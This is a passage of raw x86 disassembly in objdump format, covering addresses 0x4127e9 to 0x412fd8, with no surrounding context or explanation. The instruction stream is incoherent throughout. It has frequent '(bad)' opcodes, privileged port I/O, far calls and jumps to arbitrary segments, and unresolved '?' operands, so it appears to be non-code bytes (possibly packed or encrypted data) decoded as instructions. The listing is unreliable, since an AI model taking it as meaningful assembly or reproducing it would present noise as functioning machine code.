  4127e9:	fld    QWORD PTR [ebx+0x1a]
  4127ec:	gs mov esp,0x3919378d
  4127f2:	aaa    
  4127f3:	mov    ss,WORD PTR [edx]
  4127f5:	cmp    al,BYTE PTR [ebx-0x4c]
  4127f8:	std    
  4127f9:	pushf  
  4127fa:	stos   DWORD PTR es:[edi],eax
  4127fb:	mov    bl,0xa
  4127fd:	mov    edi,0x4c97ff1e
  412802:	daa    
  412803:	scas   al,BYTE PTR es:[edi]
  412804:	sbb    bl,BYTE PTR [esi+0x6d2454c2]
  41280a:	loopne 0x4127b5
  41280c:	add    bl,BYTE PTR [edi-0x2a39fe05]
  412812:	jne    0x4127d1
  412814:	int    0xae
  412816:	cmp    al,0xe8
  412818:	xlat   BYTE PTR ds:[ebx]
  412819:	jmp    0x4127cf
  41281b:	xor    al,0xcd
  41281d:	dec    ebp
  41281e:	mov    ebp,0x1b375680
  412823:	and    BYTE PTR [ebx],0x61
  412826:	push   esp
  412827:	outs   dx,DWORD PTR ds:[esi]
  412828:	or     edi,DWORD PTR [ebx+0x1cd0be6e]
  41282e:	mov    esp,0x7a70e604
  412833:	stc    
  412834:	xchg   ebp,eax
  412835:	inc    ecx
  412836:	daa    
  412837:	call   0xe553e700
  41283c:	and    eax,0x30857ce9
  412841:	xchg   BYTE PTR [edx-0x6a],al
  412844:	sbb    al,0xa6
  412846:	cmp    edx,DWORD PTR [ebx]
  412848:	jno    0x412839
  41284a:	stos   BYTE PTR es:[edi],al
  41284b:	xchg   esi,eax
  41284c:	push   esi
  41284d:	or     bh,dl
  41284f:	and    eax,DWORD PTR [ebp-0x5f0b45b9]
  412855:	mov    ?,WORD PTR [edi+0x7ed57947]
  41285b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41285c:	lea    ecx,ds:0x88dfecb7
  412862:	repz xor al,0xe4
  412865:	pop    edi
  412866:	mov    ah,0xb4
  412868:	mov    edi,0xe5dff64f
  41286d:	call   0x75a9:0xa7def354
  412874:	and    cl,BYTE PTR [ecx-0xc]
  412877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412878:	mov    esp,0x3e681766
  41287d:	or     BYTE PTR [edi+ecx*1],0xdb
  412881:	(bad)  [ebp-0x473d5580]
  412887:	(bad)  
  412888:	and    al,0x39
  41288a:	aad    0x48
  41288c:	std    
  41288d:	pushf  
  41288e:	loop   0x4128ae
  412890:	out    dx,eax
  412891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412892:	jmp    0x412874
  412894:	inc    eax
  412895:	fst    DWORD PTR [ebp+0x53c74b12]
  41289b:	test   al,0x6
  41289d:	push   0x58
  41289f:	inc    esp
  4128a0:	out    dx,al
  4128a1:	mov    ds:0xf8ef8837,al
  4128a6:	into   
  4128a7:	inc    esi
  4128a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128a9:	xchg   esi,eax
  4128aa:	daa    
  4128ab:	push   eax
  4128ac:	mov    ch,0x1c
  4128ae:	cs (bad) 
  4128b0:	push   0xe9286a74
  4128b5:	adc    esi,DWORD PTR fs:[eax]
  4128b8:	sar    BYTE PTR [edx+0x185634b7],cl
  4128be:	call   0x220f8f78
  4128c3:	add    BYTE PTR [esi+0x1b],dl
  4128c6:	or     esp,DWORD PTR [esi-0x141dc209]
  4128cc:	cs enter 0x4bc,0xf3
  4128d1:	dec    ecx
  4128d2:	or     bl,BYTE PTR [ebx]
  4128d4:	xchg   ebp,eax
  4128d5:	mov    ebx,0x4e34ead0
  4128da:	sub    BYTE PTR [ebp-0x6e6a76db],bh
  4128e0:	aaa    
  4128e1:	sbb    eax,0x8b8ce815
  4128e6:	pop    esp
  4128e7:	lods   al,BYTE PTR ds:[esi]
  4128e8:	pop    ebp
  4128e9:	sub    cl,BYTE PTR [edx-0x34]
  4128ec:	push   edi
  4128ed:	and    DWORD PTR [ecx+0xc894a18],edi
  4128f3:	pop    edx
  4128f4:	cmp    al,BYTE PTR [esi]
  4128f6:	stos   BYTE PTR es:[edi],al
  4128f7:	xchg   edx,eax
  4128f8:	xchg   edx,eax
  4128f9:	add    al,BYTE PTR ds:0x70ce26ec
  4128ff:	push   esi
  412900:	shl    BYTE PTR [esi-0x2ac0ae02],cl
  412906:	enter  0x1c25,0xa9
  41290a:	cmp    DWORD PTR [ebx+0x6],esp
  41290d:	sbb    dl,BYTE PTR [esi+0x3ba76ee9]
  412913:	jo     0x4128d2
  412915:	mov    bh,0xf4
  412917:	aaa    
  412918:	sbb    eax,DWORD PTR [eax-0x43567d22]
  41291e:	mov    al,0x54
  412920:	or     DWORD PTR [edi+eax*2-0x32],eax
  412924:	mov    ch,0xf1
  412926:	sbb    esi,esp
  412928:	sub    esp,DWORD PTR [ebx]
  41292a:	out    0x6c,al
  41292c:	sbb    ebx,ecx
  41292e:	adc    eax,0xf450e5a0
  412933:	imul   ebp,DWORD PTR [eax+0x4df25ba8],0x95d6a680
  41293d:	jb     0x4128d7
  41293f:	les    ecx,FWORD PTR [ebp-0x28098d24]
  412945:	test   al,0x83
  412947:	sahf   
  412948:	mov    ebp,0x2d10a1fc
  41294d:	jge    0x41292c
  41294f:	cmp    eax,0xbc6fa809
  412954:	call   0xae19:0x2727a05f
  41295b:	jmp    0xb822:0xc7e5b97b
  412962:	xlat   BYTE PTR ds:[ebx]
  412963:	xor    DWORD PTR [esi+0x45],0x9ec35dec
  41296a:	jb     0x412941
  41296c:	int3   
  41296d:	xchg   edx,eax
  41296e:	jp     0x41295e
  412970:	nop
  412971:	adc    BYTE PTR [edi-0x5b],ch
  412974:	es fstp st(3)
  412977:	add    DWORD PTR [eiz*8-0x2abaf14b],esp
  41297e:	icebp  
  41297f:	out    0xa9,al
  412981:	scas   al,BYTE PTR es:[edi]
  412982:	repnz imul ebx,DWORD PTR [eax],0x68d982b9
  412989:	jne    0x4129ac
  41298b:	(bad)
  41298e:	out    dx,al
  41298f:	fild   QWORD PTR ss:[ebx+0x5caa1b4b]
  412996:	push   cs
  412997:	test   DWORD PTR [esi-0x7bfd3d8d],edi
  41299d:	mov    dl,0xa0
  41299f:	(bad)  
  4129a0:	dec    edi
  4129a1:	test   al,0xb6
  4129a3:	xchg   edi,eax
  4129a4:	add    eax,0x44b3eba3
  4129a9:	jecxz  0x4129b0
  4129ab:	xchg   ebp,eax
  4129ac:	adc    edi,0x5b
  4129af:	sub    ebx,DWORD PTR [esi]
  4129b1:	and    esp,eax
  4129b3:	(bad)  
  4129b4:	jmp    0x7d67:0x5498e828
  4129bb:	lock adc BYTE PTR [edx+0x356dce63],ah
  4129c2:	lds    ebx,FWORD PTR [edi+ebx*1]
  4129c5:	test   eax,0x9b34fc96
  4129ca:	arpl   WORD PTR [esi],sp
  4129cc:	xchg   BYTE PTR [ecx-0x77894b65],bl
  4129d2:	or     al,0x98
  4129d4:	mov    dl,0xec
  4129d6:	xor    ebp,edx
  4129d8:	adc    al,0xfa
  4129da:	enter  0xedc4,0xb7
  4129de:	lods   al,BYTE PTR ds:[esi]
  4129df:	pop    ds
  4129e0:	pop    esp
  4129e1:	pushf  
  4129e2:	mov    ebx,0xc3fd4c22
  4129e7:	adc    edx,DWORD PTR ds:0xb1b6107
  4129ed:	jae    0x412a6b
  4129ef:	xchg   ah,bh
  4129f1:	push   esp
  4129f2:	mov    bh,0xa4
  4129f4:	dec    edx
  4129f5:	scas   al,BYTE PTR es:[edi]
  4129f6:	cmp    esi,DWORD PTR [ebp+0x5132de09]
  4129fc:	ficomp DWORD PTR [ebx-0x36e15e88]
  412a02:	into   
  412a03:	inc    edx
  412a04:	sub    BYTE PTR [esi],bh
  412a06:	sub    eax,0x4c2c608a
  412a0b:	mov    dl,BYTE PTR [edi+0x1a2a98ce]
  412a11:	fnstsw WORD PTR [edi+0x17291d7c]
  412a17:	add    eax,0xfd2cc9d7
  412a1c:	jecxz  0x4129b8
  412a1e:	sbb    eax,DWORD PTR [edi-0x6b]
  412a21:	scas   al,BYTE PTR es:[edi]
  412a22:	sub    ebx,DWORD PTR [eax-0x3c0aa5]
  412a28:	mov    dh,0xe7
  412a2a:	scas   eax,DWORD PTR es:[edi]
  412a2b:	jbe    0x4129ad
  412a2d:	jmp    0x7a1996f0
  412a32:	pop    ebx
  412a33:	test   DWORD PTR [ebp-0x59],eax
  412a36:	push   eax
  412a37:	hlt    
  412a38:	mov    eax,0x17b2954f
  412a3d:	pop    ecx
  412a3e:	sub    DWORD PTR [ebx-0x213ac83d],0xffffff92
  412a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a46:	cmp    ebp,esp
  412a48:	push   es
  412a49:	adc    BYTE PTR [ebp-0x40ae7abd],bh
  412a4f:	add    cl,BYTE PTR [edi+eiz*4-0x65]
  412a53:	cwde   
  412a54:	dec    ecx
  412a55:	adc    ecx,esi
  412a57:	dec    esi
  412a58:	mov    ds:0x579faba3,eax
  412a5d:	xchg   DWORD PTR [ecx-0x2b],ebx
  412a60:	sti    
  412a61:	sbb    eax,0xec27a5f4
  412a66:	mov    ebx,0x4846a874
  412a6b:	sbb    ebp,esi
  412a6d:	inc    ecx
  412a6e:	popa   
  412a6f:	repz xor edi,DWORD PTR [edi+0x391dfc37]
  412a76:	call   DWORD PTR [esi+0x2b47d15f]
  412a7c:	shl    BYTE PTR [edi+0xb226a0b],0xb5
  412a83:	dec    esp
  412a84:	cmp    DWORD PTR [ecx-0x34],ebp
  412a87:	jns    0x412a93
  412a89:	call   0x67e2:0x1bbe893
  412a90:	int3   
  412a91:	call   0x542:0xaf292abb
  412a98:	leave  
  412a99:	aaa    
  412a9a:	mov    al,ds:0x7bef4f7b
  412a9f:	cmp    DWORD PTR [edi],ecx
  412aa1:	or     esp,DWORD PTR [edx+edi*2]
  412aa4:	shl    BYTE PTR [ecx-0x4b],1
  412aa7:	in     al,dx
  412aa8:	aad    0xb
  412aaa:	outs   dx,DWORD PTR ds:[esi]
  412aab:	clc    
  412aac:	jl     0x412a9f
  412aae:	mov    esi,0xd013199c
  412ab3:	in     al,0xfd
  412ab5:	fldenv [eax+0x379b9852]
  412abb:	or     ebp,0x18
  412abe:	dec    esp
  412abf:	pop    ebx
  412ac0:	cmc    
  412ac1:	mov    ds,WORD PTR [eax]
  412ac3:	in     eax,dx
  412ac4:	es jmp 0xee51:0x9a02c7b3
  412acc:	test   eax,0x2865fd9a
  412ad1:	lods   al,BYTE PTR ds:[esi]
  412ad2:	out    0x95,al
  412ad4:	push   ebp
  412ad5:	loopne 0x412b47
  412ad7:	cli    
  412ad8:	xchg   edx,eax
  412ad9:	dec    eax
  412ada:	retf   
  412adb:	push   0x6875fcf4
  412ae0:	lods   eax,DWORD PTR ds:[esi]
  412ae1:	sti    
  412ae2:	mov    cl,0x74
  412ae4:	jmp    0x11db:0x456e6a0a
  412aeb:	out    0x63,al
  412aed:	and    DWORD PTR ds:[eax+0x1b],ebx
  412af1:	sub    DWORD PTR [edi+0x2],esp
  412af4:	cmp    bl,ah
  412af6:	cmp    esp,DWORD PTR [esi]
  412af8:	int3   
  412af9:	shr    DWORD PTR [ebx+0x44],1
  412afc:	fadd   QWORD PTR [edi]
  412afe:	outs   dx,DWORD PTR ds:[esi]
  412aff:	lock sahf 
  412b01:	xchg   dh,dl
  412b03:	mov    al,0x24
  412b05:	cmp    DWORD PTR [ebp+ebx*8-0xeafc77d],ecx
  412b0c:	mov    ebx,0x7dee6e5b
  412b11:	sahf   
  412b12:	fwait
  412b13:	stos   BYTE PTR es:[edi],al
  412b14:	xor    bl,al
  412b16:	push   0xfffffff1
  412b18:	sbb    edi,DWORD PTR [ecx]
  412b1a:	adc    eax,0xa351b0de
  412b1f:	xchg   edx,eax
  412b20:	xor    al,0xa0
  412b22:	imul   esp,DWORD PTR [esi+0x47e85c2b],0x23
  412b29:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412b2c:	adc    eax,0xc8d846a6
  412b31:	jne    0x412b3a
  412b33:	imul   esp,esi,0x1dca5882
  412b39:	(bad)  
  412b3b:	mov    al,0xcd
  412b3d:	push   0xdc87e1d6
  412b42:	mov    edx,0xd2a52fd4
  412b47:	ins    DWORD PTR es:[edi],dx
  412b48:	out    0xb6,al
  412b4a:	leave  
  412b4b:	pop    esp
  412b4c:	imul   ebx,DWORD PTR [ebx+0x317b245b],0xfd05c185
  412b56:	mov    ah,0xa2
  412b58:	data16 mov ds:0x9b4d05ba,al
  412b5e:	push   edi
  412b5f:	(bad)  
  412b60:	fwait
  412b61:	pushf  
  412b62:	fwait
  412b63:	nop
  412b64:	dec    esp
  412b65:	stc    
  412b66:	cli    
  412b67:	dec    esp
  412b68:	into   
  412b69:	mov    eax,ds:0x4916e699
  412b6e:	mul    BYTE PTR [ebx+0x400ffac2]
  412b74:	repnz mov eax,ds:0xa0f548cb
  412b7a:	shl    DWORD PTR [ebp+0x67],cl
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	pop    esp
  412b7f:	cmc    
  412b80:	es call 0xd499:0x3dfda4ba
  412b88:	ss mov al,0xfa
  412b8b:	pop    eax
  412b8c:	cmp    al,0x9d
  412b8e:	add    eax,0x3561efa
  412b93:	inc    ecx
  412b94:	jp     0x412b3f
  412b96:	mov    ch,0xb4
  412b98:	xchg   ebx,eax
  412b99:	fwait
  412b9a:	push   ebp
  412b9b:	cld    
  412b9c:	and    eax,0x6de9fd84
  412ba1:	(bad)
  412ba5:	imul   edx,DWORD PTR ds:0x1d1c40ed,0x649f5a2b
  412baf:	mov    ds:0xd0baab26,eax
  412bb4:	sbb    BYTE PTR [edi],cl
  412bb6:	xchg   ebp,eax
  412bb7:	repz dec eax
  412bb9:	mov    eax,0xfbbbff66
  412bbe:	mov    ecx,0xd9d10cd4
  412bc3:	mov    eax,ds:0xf08b9f44
  412bc8:	jl     0x412c3a
  412bca:	push   edx
  412bcb:	push   esp
  412bcc:	fidiv  DWORD PTR [ebx+0x39]
  412bcf:	or     DWORD PTR [edi-0x719b351f],edi
  412bd5:	imul   esp,DWORD PTR [eax+0x482667a6],0x7ba78f44
  412bdf:	jecxz  0x412bfb
  412be1:	test   al,0x33
  412be3:	repnz stos BYTE PTR es:[edi],al
  412be5:	aaa    
  412be6:	dec    ebp
  412be7:	push   0x94bb0a06
  412bec:	(bad)  
  412bed:	test   al,0xf
  412bef:	mov    WORD PTR [ebp-0x44],es
  412bf2:	stos   BYTE PTR es:[edi],al
  412bf3:	mov    BYTE PTR [esi-0x53e005eb],al
  412bf9:	xchg   ebx,eax
  412bfa:	nop
  412bfb:	popf   
  412bfc:	and    DWORD PTR [eax+0x2],esi
  412bff:	out    dx,eax
  412c00:	and    BYTE PTR [ecx+0x56],bh
  412c03:	sub    al,0x6d
  412c05:	or     al,0x72
  412c07:	lods   eax,DWORD PTR es:[esi]
  412c09:	sub    DWORD PTR [ebx-0x72157a12],0x2dab1ef2
  412c13:	mov    ah,0x75
  412c15:	mov    ecx,0xf5731354
  412c1a:	dec    ebx
  412c1b:	or     al,0xca
  412c1d:	jb     0x412bdc
  412c1f:	ins    BYTE PTR es:[edi],dx
  412c20:	and    eax,0x52ecc597
  412c25:	loop   0x412bfc
  412c27:	xchg   edx,eax
  412c28:	and    al,0xb9
  412c2a:	jno    0x412c76
  412c2c:	cmp    DWORD PTR [ecx-0x7e],ebp
  412c2f:	lods   al,BYTE PTR ds:[esi]
  412c30:	sub    edx,DWORD PTR [ebp+0x148cf24d]
  412c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c37:	pop    edx
  412c38:	fldenv [edx+0x4501f7]
  412c3e:	daa    
  412c3f:	popa   
  412c40:	inc    BYTE PTR [esi]
  412c42:	mov    edx,0xc5797534
  412c47:	fmul   DWORD PTR [edi+0x6b73bba3]
  412c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c4e:	(bad)  
  412c4f:	xchg   edi,eax
  412c50:	gs (bad) 
  412c53:	add    ebp,DWORD PTR [edi-0x578b4c38]
  412c59:	rol    al,1
  412c5b:	aas    
  412c5c:	jne    0x412c00
  412c5e:	jnp    0x412c71
  412c60:	push   ss
  412c61:	pop    edx
  412c62:	sbb    al,0xe0
  412c64:	jne    0x412c3d
  412c66:	mov    esi,0x71287cf9
  412c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6c:	dec    ecx
  412c6d:	(bad)  
  412c6e:	mov    bl,0xa8
  412c70:	pop    edx
  412c71:	cwde   
  412c72:	(bad)  
  412c74:	pop    ds
  412c75:	xchg   ecx,eax
  412c76:	and    DWORD PTR [ecx-0x4e],ebx
  412c79:	pop    ds
  412c7a:	call   0x15cf:0xb3091bc6
  412c81:	add    eax,ebp
  412c83:	int    0xbd
  412c85:	cmp    edi,ebp
  412c87:	outs   dx,DWORD PTR ds:[esi]
  412c88:	and    bl,BYTE PTR [ecx-0x1f]
  412c8b:	add    cl,BYTE PTR [ebx]
  412c8d:	(bad)  
  412c8e:	adc    ebx,DWORD PTR [edi]
  412c90:	sbb    al,0x89
  412c92:	adc    ch,al
  412c94:	bound  edx,QWORD PTR [edx+edx*1+0x5b9aa149]
  412c9b:	ficom  WORD PTR [edi+0x73]
  412c9e:	outs   dx,DWORD PTR ds:[esi]
  412c9f:	xchg   edi,eax
  412ca0:	jmp    0xddc0e50f
  412ca5:	mov    ecx,eax
  412ca7:	xchg   esp,eax
  412ca8:	mov    edx,0x969ae453
  412cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cae:	mov    ebx,0xffa6a2fa
  412cb3:	cmp    DWORD PTR [esi-0x27],ebp
  412cb6:	out    0x19,al
  412cb8:	test   BYTE PTR [eax],bh
  412cba:	ret    
  412cbb:	xor    dl,bl
  412cbd:	xchg   edx,eax
  412cbe:	mov    eax,0x70510f24
  412cc3:	jne    0x412d1a
  412cc5:	sub    ecx,esp
  412cc7:	icebp  
  412cc8:	push   ds
  412cc9:	in     eax,0x3c
  412ccb:	jmp    0x591c:0x52bc6a7c
  412cd2:	or     edi,ebp
  412cd4:	or     DWORD PTR [edi+0x1d455153],esi
  412cda:	ds in  eax,dx
  412cdc:	pop    edi
  412cdd:	cmc    
  412cde:	fistp  WORD PTR gs:[ecx]
  412ce1:	sbb    DWORD PTR [edi],edx
  412ce3:	mov    ?,edx
  412ce5:	jb     0x412d39
  412ce7:	fcomp  QWORD PTR ds:0x2f1a4ba0
  412ced:	aaa    
  412cee:	(bad)  
  412cef:	ins    BYTE PTR es:[edi],dx
  412cf0:	mov    cl,0xe2
  412cf2:	ret    0x935a
  412cf5:	ins    DWORD PTR es:[edi],dx
  412cf6:	lods   eax,DWORD PTR ds:[esi]
  412cf7:	js     0x412d13
  412cf9:	imul   edx,DWORD PTR [ecx-0x6e7039],0xcde39da8
  412d03:	cmp    BYTE PTR [ebp-0x4c],ch
  412d06:	sbb    eax,DWORD PTR [edi]
  412d08:	es push esp
  412d0a:	out    0x64,al
  412d0c:	rcl    DWORD PTR [edi],cl
  412d0e:	xchg   edi,eax
  412d0f:	xor    edi,DWORD PTR [eax+0x2854bccf]
  412d15:	scas   eax,DWORD PTR es:[edi]
  412d16:	mov    ah,0xc6
  412d18:	push   ebp
  412d19:	test   al,0x80
  412d1b:	in     eax,dx
  412d1c:	mov    eax,ds:0x1821f4ea
  412d21:	leave  
  412d22:	hlt    
  412d23:	fwait
  412d24:	xor    al,0xf6
  412d26:	call   0xdc132d15
  412d2b:	mov    ch,0xf7
  412d2d:	lods   al,BYTE PTR ds:[esi]
  412d2e:	pop    edx
  412d2f:	xor    eax,0x434ea11e
  412d34:	or     eax,0xf7dabbfa
  412d39:	call   0xa8ee:0x4fcae171
  412d40:	frstor [ebx+ebp*2-0x6c8c4cde]
  412d47:	xor    DWORD PTR [edi+ebp*8],ecx
  412d4a:	imul   DWORD PTR [ebx+0x34b0e9b0]
  412d50:	pop    edi
  412d51:	fwait
  412d52:	inc    edx
  412d53:	xchg   BYTE PTR [esi+0x1c9a8bff],dh
  412d59:	push   ecx
  412d5a:	ret    0xb2bf
  412d5d:	retf   
  412d5e:	stos   BYTE PTR es:[edi],al
  412d5f:	aad    0xa0
  412d61:	xchg   DWORD PTR [edi],ebp
  412d63:	xor    eax,0x4630921f
  412d68:	retf   
  412d69:	lahf   
  412d6a:	sub    esi,DWORD PTR [ecx-0x6a40f75d]
  412d70:	jecxz  0x412d82
  412d72:	out    dx,al
  412d73:	pusha  
  412d74:	dec    ebp
  412d75:	dec    eax
  412d76:	mov    ebp,0xee8eae4
  412d7b:	add    esp,DWORD PTR [ebp-0x60]
  412d7e:	jnp    0x412d34
  412d80:	sti    
  412d81:	push   0x33
  412d83:	and    bh,bh
  412d85:	mov    ds:0x9762edcc,al
  412d8a:	mov    edx,0xe590864
  412d8f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412d91:	cmp    edx,edx
  412d93:	out    dx,al
  412d94:	jo     0x412d63
  412d96:	cdq    
  412d97:	rcr    BYTE PTR [edi],1
  412d99:	sbb    esp,ebx
  412d9b:	scas   eax,DWORD PTR es:[edi]
  412d9c:	push   cs
  412d9d:	inc    edi
  412d9e:	fwait
  412d9f:	leave  
  412da0:	in     eax,dx
  412da1:	call   0x2b1c:0xc87498ab
  412da8:	ret    0xaea9
  412dab:	retf   0xc367
  412dae:	mov    bh,0x14
  412db0:	(bad)  
  412db1:	sti    
  412db2:	repnz iret 
  412db4:	xor    eax,0x5fe9cc23
  412db9:	or     ebx,DWORD PTR [ebx-0x6a]
  412dbc:	adc    BYTE PTR [ecx-0x7c],ah
  412dbf:	xchg   esp,eax
  412dc0:	int    0x2f
  412dc2:	cdq    
  412dc3:	xor    eax,0xf01974d7
  412dc8:	neg    DWORD PTR [ebp+0x1f]
  412dcb:	dec    ebx
  412dcc:	and    eax,0x15ad2111
  412dd1:	or     eax,0x8cdd618f
  412dd6:	sub    dh,BYTE PTR [ecx-0x25687a09]
  412ddc:	std    
  412ddd:	mov    edi,DWORD PTR [ecx-0x745b5b60]
  412de3:	adc    DWORD PTR ds:[ecx],ebp
  412de6:	lds    ecx,FWORD PTR [ebx]
  412de8:	iret   
  412de9:	(bad)  
  412dea:	lds    ecx,FWORD PTR ds:0x18776cd1
  412df0:	or     eax,0x6aefbc34
  412df5:	add    eax,0x78e5ce4f
  412dfa:	out    dx,eax
  412dfb:	addr16 sbb eax,0x8848e1a1
  412e01:	scas   al,BYTE PTR es:[edi]
  412e02:	pop    ss
  412e03:	call   DWORD PTR [edi]
  412e05:	cmp    DWORD PTR [edi+0x23],edi
  412e08:	jb     0x412e67
  412e0a:	movd   mm1,DWORD PTR [ebx+ebx*4-0x35]
  412e0f:	(bad)  
  412e10:	mov    cl,0x4a
  412e12:	and    BYTE PTR [ecx+0x7942ea7f],cl
  412e18:	frstor [edx]
  412e1a:	mov    ch,0x14
  412e1c:	sbb    ah,BYTE PTR [eax+edx*8+0x47]
  412e20:	(bad)  
  412e21:	rcr    DWORD PTR [edi],1
  412e23:	pop    esp
  412e24:	push   0xffffffa2
  412e26:	sahf   
  412e27:	loopne 0x412e8f
  412e29:	jecxz  0x412e53
  412e2b:	jae    0x412e67
  412e2d:	adc    al,0xb3
  412e2f:	je     0x412e3c
  412e31:	jb     0x412e7a
  412e33:	ja     0x412de9
  412e35:	je     0x412e76
  412e37:	xchg   esp,eax
  412e38:	and    eax,0x4d405cb1
  412e3d:	jg     0x412e9d
  412e3f:	sub    dh,BYTE PTR [ecx]
  412e41:	sub    DWORD PTR [eax],ebx
  412e43:	pop    edi
  412e44:	push   ds
  412e45:	lods   eax,DWORD PTR ds:[esi]
  412e46:	(bad)  
  412e47:	and    eax,0xd8ebc121
  412e4c:	inc    eax
  412e4d:	pushf  
  412e4e:	inc    esp
  412e4f:	inc    ebx
  412e50:	sbb    cl,BYTE PTR [ecx-0x78878251]
  412e56:	pop    ds
  412e57:	clc    
  412e58:	std    
  412e59:	and    al,0x1a
  412e5b:	cmp    eax,0x101b998d
  412e60:	loopne 0x412ede
  412e62:	cmp    bl,BYTE PTR ds:0x99e43c23
  412e68:	out    dx,al
  412e69:	add    al,0xb9
  412e6b:	je     0x412e0e
  412e6d:	sbb    BYTE PTR [edx-0x19],ah
  412e70:	shl    DWORD PTR [ecx+0x3d],1
  412e73:	jo     0x412e2d
  412e75:	out    dx,al
  412e76:	mov    edx,DWORD PTR [esi+0x6d]
  412e79:	mov    al,ds:0x7e2cf173
  412e7e:	gs dec eax
  412e80:	or     edi,DWORD PTR [edi-0x4f]
  412e83:	add    al,0x99
  412e85:	fist   DWORD PTR [esi]
  412e87:	pop    ebp
  412e88:	xlat   BYTE PTR ds:[ebx]
  412e89:	cwde   
  412e8a:	out    dx,eax
  412e8b:	fisub  WORD PTR [esi+0x2023d6d6]
  412e91:	inc    ecx
  412e92:	mov    bh,0x87
  412e94:	xor    cl,bl
  412e96:	fwait
  412e97:	je     0x412eb4
  412e99:	adc    dh,bl
  412e9b:	sahf   
  412e9c:	and    BYTE PTR [edi-0x15],bl
  412e9f:	jmp    0xf1613e19
  412ea4:	xchg   BYTE PTR [esi-0x46da4e91],ch
  412eaa:	and    BYTE PTR [eax-0x59],bh
  412ead:	inc    edx
  412eae:	inc    ebx
  412eaf:	or     DWORD PTR [edi],ebx
  412eb1:	jne    0x412e50
  412eb3:	inc    ebp
  412eb4:	mov    bl,0xcf
  412eb6:	pop    edi
  412eb7:	aaa    
  412eb8:	in     eax,dx
  412eb9:	(bad)  
  412eba:	(bad)  
  412ebb:	in     al,dx
  412ebc:	ror    BYTE PTR [ebx-0x462e3f48],cl
  412ec2:	mov    bh,0x34
  412ec4:	fs popf 
  412ec6:	bound  eax,QWORD PTR [edi+edx*2-0x3144124c]
  412ecd:	inc    ebx
  412ece:	mov    DWORD PTR [ecx],ecx
  412ed0:	sbb    ecx,edx
  412ed2:	push   ebx
  412ed3:	int3   
  412ed4:	push   edx
  412ed5:	fimul  DWORD PTR [ebx-0x4763225f]
  412edb:	(bad)  
  412edc:	sar    BYTE PTR [ebp-0x4b],cl
  412edf:	ins    DWORD PTR es:[edi],dx
  412ee0:	int    0x9c
  412ee2:	sti    
  412ee3:	call   0x447b:0xc005f14d
  412eea:	mov    ds:0xb02d64d4,al
  412eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ef0:	(bad)  
  412ef1:	jno    0x412f18
  412ef3:	cmp    al,0x25
  412ef5:	push   0x887bf28e
  412efa:	inc    esi
  412efb:	dec    ebp
  412efc:	and    BYTE PTR [ecx-0x41],ch
  412eff:	imul   esp,DWORD PTR [edx-0x5b],0x64
  412f03:	outs   dx,DWORD PTR ds:[esi]
  412f04:	dec    edi
  412f05:	mov    eax,ds:0xd038545b
  412f0a:	push   edi
  412f0b:	stos   DWORD PTR es:[edi],eax
  412f0c:	cmp    al,0xac
  412f0e:	push   cs
  412f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f10:	repnz mov eax,0xe4d3f4bd
  412f16:	fsubr  st(4),st
  412f18:	test   DWORD PTR [edi],ebp
  412f1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f1b:	stc    
  412f1c:	loop   0x412ecf
  412f1e:	inc    ecx
  412f1f:	sub    edi,DWORD PTR [ebp+0x5c]
  412f22:	inc    ebp
  412f23:	in     eax,0x7c
  412f25:	pop    ss
  412f26:	daa    
  412f27:	xchg   ecx,eax
  412f28:	ss jmp 0x8a9c:0x9a6f5e14
  412f30:	cwde   
  412f31:	push   0xcded1668
  412f36:	mov    ecx,0x5b2c3cd4
  412f3b:	stc    
  412f3c:	mov    ch,0x87
  412f3e:	imul   ebp,ebx,0x146cdccf
  412f44:	dec    edx
  412f45:	jmp    0xd75f893a
  412f4a:	pop    edi
  412f4b:	in     eax,0xd0
  412f4d:	loopne 0x412f33
  412f4f:	out    0x55,al
  412f51:	push   es
  412f52:	js     0x412f42
  412f54:	xor    eax,0x18a15dad
  412f59:	jns    0x412f70
  412f5b:	add    eax,0x5325108d
  412f60:	sbb    ebx,DWORD PTR [esi-0x192bc3c5]
  412f66:	stos   DWORD PTR es:[edi],eax
  412f67:	js     0x16d15a8a
  412f6d:	sub    eax,0x40f4b4bb
  412f72:	cmc    
  412f73:	ds add eax,0x36efbaf2
  412f79:	ins    BYTE PTR es:[edi],dx
  412f7a:	(bad)  
  412f7b:	mov    dl,ch
  412f7d:	cli    
  412f7e:	outs   dx,BYTE PTR ds:[esi]
  412f7f:	pop    ds
  412f80:	and    eax,0x219793a5
  412f85:	aam    0x2a
  412f87:	add    al,0x85
  412f89:	pushf  
  412f8a:	cmp    edx,esi
  412f8c:	mov    dh,0x76
  412f8e:	xor    edi,edx
  412f90:	dec    ebx
  412f91:	or     DWORD PTR [esi-0x33],edx
  412f94:	or     BYTE PTR [ebp-0x72accf92],ah
  412f9a:	jecxz  0x412f8d
  412f9c:	xchg   esp,eax
  412f9d:	mov    eax,ds:0x4352c7db
  412fa2:	fld    QWORD PTR [esi+0x45]
  412fa5:	outs   dx,DWORD PTR ds:[esi]
  412fa6:	nop
  412fa7:	div    ah
  412fa9:	inc    ecx
  412faa:	mov    bh,0x64
  412fac:	lea    esp,[ebp*8-0x200daa4]
  412fb3:	jmp    0xa85d7879
  412fb8:	push   esp
  412fb9:	sub    esi,esp
  412fbb:	add    BYTE PTR [edi+0x5ec52708],ah
  412fc1:	je     0x412fc8
  412fc3:	out    0x9b,al
  412fc5:	(bad)  
  412fc6:	out    0xac,eax
  412fc8:	xchg   ah,ch
  412fca:	or     BYTE PTR [ebp+0x2032b79e],ah
  412fd0:	xchg   esp,eax
  412fd1:	mov    ecx,0xb00ddb1
  412fd6:	mov    ch,0x84
  412fd8:	dec    edi
